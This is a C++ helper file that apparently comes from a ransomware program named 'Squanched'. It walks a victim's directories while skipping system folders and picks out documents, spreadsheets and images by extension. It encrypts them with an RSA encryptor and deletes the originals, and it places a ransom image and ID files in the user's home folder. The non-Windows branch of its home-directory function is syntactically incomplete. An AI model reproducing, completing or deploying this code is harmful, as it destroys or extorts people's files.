#pragma warning(disable:4996)
#include "Utils.h"
#include <iostream>

#include <unordered_set>
#define SIZE_THRESHOLD 1L<<3


std::string string_to_hex(const std::string& input)
{
	static const char* const lut = "0123456789ABCDEF";
	size_t len = input.length();

	std::string output;
	output.reserve(2 * len);
	for (size_t i = 0; i < len; ++i)
	{
		const unsigned char c = input[i];
		output.push_back(lut[c >> 4]);
		output.push_back(lut[c & 15]);
	}
	return output;
}


string find_extension(const string& path)
{
	for (int i = path.size() - 1; i > 0; --i) {
		if (path[i] == '.')
			return string(path.begin() + i + 1, path.end());
	}
	return string("");
}

bool do_encrypt(const string& path)
{
	static std::unordered_set<string> ext_whitelist = {
		"pdf", "odt", "docx", "pptx", "txt",
		"mov", "zip", "jpg", "jpeg", "xls",
		"doc", 	"ppt", "gif", "png", "xlsx"
	};
	std::string ext = find_extension(path);
	return ext_whitelist.find(ext) != ext_whitelist.end();
}

bool do_decrypt(const string& path)
{
	return "." + find_extension(path) == LOCKED_EXTENSION;
}

bool is_valid_folder(const string& path)
{
	static std::unordered_set<string> unvalid_folder = {
		"Windows", "Program Files"
	};
	for (auto folder : unvalid_folder)
	{
		if(path.find(folder) != string::npos)
		{
			return false;
		}
	}
	return true;
}

void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
	string path;
	directory_iterator end_itr;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			if (is_valid_folder(path))
			{
				iterate(path, process, iv, key);
			}
		}
		else {
			process(path,iv,key);
			remove(path);
		}
	}
}

void iterate2(const path& parent, Processing_func process, RsaEncryptor rsaEncryptor,
	std::vector<string> processedPaths)
{
	string path;
	directory_iterator end_itr;
	static long long sumSize;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			if (is_valid_folder(path))
			{
				iterate2(path, process, rsaEncryptor, processedPaths);
			}
		}
		else {
			if (!do_encrypt(path)) continue;//see TODO 2 rows below
			process(path, rsaEncryptor);
			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
			processedPaths.push_back(path);
			sumSize += file_size(path);
			if(sumSize >= SIZE_THRESHOLD)
			{
				for (auto& fileToDelete : processedPaths)
				{
					remove(fileToDelete);
				}
				sumSize = 0;
				processedPaths.clear();
			}
		}
	}
}

size_t getFileSize(const string path)
{
	std::ifstream plaintext;
	plaintext.open(path, std::ios::binary);
	if (!plaintext.is_open()) {
		return 0;
	}
	plaintext.seekg(0, std::ios::end);
	std::streampos plaintextLen = plaintext.tellg();
	plaintext.close();
	return plaintextLen;
}

string get_path_to_jpeg()
{
	return get_home() + R"(\squanched.jpg)";
}

string get_path_to_id() {
	return get_home() + R"(\SquanchedID.id)";
}
string get_path_to_ENC()
{
	return get_home() + R"(\SquanchedENC.id)";
}
string get_home() {
#ifdef _WIN32
	string path;

	char* drive = getenv("USERPROFILE");
	if (drive == NULL) {
		throw std::runtime_error("USERPROFILE environment variable not found");
	}
	else {
		path = drive;
	}

	return path;
#else
	struct passwd *pw;

	uid_t uid = geteuid();
	pw = getpwuid(uid);
	if (pw) {
		return string(pw->pw_dir);
#endif
}


